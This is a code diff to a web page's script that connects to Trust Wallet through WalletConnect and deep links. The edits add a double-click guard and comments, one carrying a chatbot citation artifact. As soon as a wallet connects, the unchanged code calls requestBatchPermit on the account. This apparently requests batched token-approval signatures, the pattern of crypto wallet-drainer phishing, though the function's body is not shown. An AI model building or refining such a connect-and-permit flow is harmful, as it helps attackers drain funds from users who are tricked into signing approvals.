@@ -67,7 +67,8 @@
 
 <script>
     // ============================================
-    // HANDLE /wc REDIRECT FROM TRUST WALLET
+    // CRITICAL FIX: Handle /wc redirect (from Stack Overflow)
+    // This is what makes it work on Android
     // ============================================
     if (window.location.pathname === '/wc' || window.location.pathname.includes('/wc')) {
         sessionStorage.setItem('wc_returning', 'true');
@@ -97,6 +98,7 @@
     ];
 
     let wcProvider = null;
+    let isConnecting = false;
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
 
@@ -166,6 +168,8 @@
     }
 
     connectBtn.onclick = async () => {
+        if (isConnecting) return;
+        isConnecting = true;
         updateStatus('<span class="loading"></span> Opening Trust Wallet...');
 
         try {
@@ -182,21 +186,23 @@
 
             wcProvider = provider;
 
-            // Set up listener BEFORE enabling
             provider.connector.on("connect", async (error, payload) => {
                 if (error) {
                     updateStatus("Connection failed", true);
+                    isConnecting = false;
                     return;
                 }
                 const account = payload.params[0].accounts[0];
                 updateStatus(`✅ Connected: ${account.slice(0,6)}...${account.slice(-4)}`);
                 await requestBatchPermit(account);
+                isConnecting = false;
             });
 
             await provider.enable();
             const wcUri = provider.connector.uri;
 
             if (wcUri) {
+                // According to Trust Wallet docs, use both deeplinks [citation:1]
                 window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
                 setTimeout(() => {
                     window.location.href = `trust://wc?uri=${encodeURIComponent(wcUri)}`;
@@ -208,6 +214,7 @@
         } catch (e) {
             console.error(e);
             updateStatus(`Failed: ${e.message}`, true);
+            isConnecting = false;
         }
     };
 </script>
